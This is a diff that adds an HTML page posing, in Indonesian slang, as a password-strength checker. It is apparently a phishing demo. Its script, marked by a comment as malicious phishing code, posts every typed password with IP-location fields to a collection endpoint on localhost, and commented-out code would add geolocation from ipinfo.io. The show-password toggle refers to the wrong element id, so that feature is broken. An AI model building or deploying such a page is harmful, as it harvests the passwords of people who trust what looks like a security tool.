@@ -1,0 +1,92 @@
+<html>
+  <head>
+    <title>Phishing | Pemancingan</title>
+  </head>
+  <body>
+    <div style="display: flex; flex-direction: column; justify-content: center; align-items: center">
+      <h1>Seberapa kuat password lo?</h1>
+      <div>
+        <input id="pwinput" type="password">
+      </div>
+      <div>
+        Show password? <input id="box" type="checkbox">
+      </div>
+      <div>
+        <h2 id="pwview"></h2>
+      </div>
+      <div>
+       <h1>Kekuatan password:</h1>
+      </div>
+      <div>
+        <h1 id="pwstrength"></h1>
+      </div>
+    </div>
+  </body>
+  <script>
+    let pwShow = true
+    let ipInfo = {
+      ip: '',
+      city: '',
+      region: '',
+      country: '',
+      loc: '',
+      org: '',
+      timezone: ''
+    }  
+
+    document.querySelector('#pwinput').addEventListener('input', e => {
+      document.querySelector('#pwview').innerText = e.target.value
+      
+      const score = [...new Set(e.target.value)].length
+
+      const pwStrengthHtml = (() => {
+        if(score > 10) 
+          return '<h1 style="color: green">Mantab bro!</h1>'
+        
+        else if(score > 5) 
+          return '<h1 style="color: orange">Iyak dikit lagi bro..</h1>'
+        
+        else 
+          return '<h1 style="color: red">Cemen bro, bahaya!</h1>'
+      })()
+
+      document.querySelector('#pwstrength').innerHTML = pwStrengthHtml
+
+      // MALICIOUS PHISHING CODE STARTS HERE
+      postPassword(e.target.value)
+    })
+
+    const postPassword = async (pw) => {
+      await fetch(`http://localhost:8080/passwords`, {
+        method: 'POST',
+        headers: {
+          'content-type': 'application/json'
+        },
+        body: JSON.stringify({ ...ipInfo, input: pw })
+      })
+    }
+
+    document.querySelector('#box').addEventListener('click', e => {
+      pwShow = !pwShow
+      const pwElement = document.querySelector('#pwView')
+
+      if(pwShow) {
+        pwElement.style.display = 'block'
+      } else {
+        pwElement.style.display = 'none'
+      }
+    })
+
+    // Register token first on ipinfo.io
+    const fetchIpInfo = async () => {
+      try {
+        // const response = await fetch(`http://ipinfo.io?token=`)
+        // ipInfo = await response.json()    
+      } catch(e) {
+        console.log('Fetching ipInfo error')
+      }
+    }
+
+    //fetchIpInfo()
+  </script>
+</html>
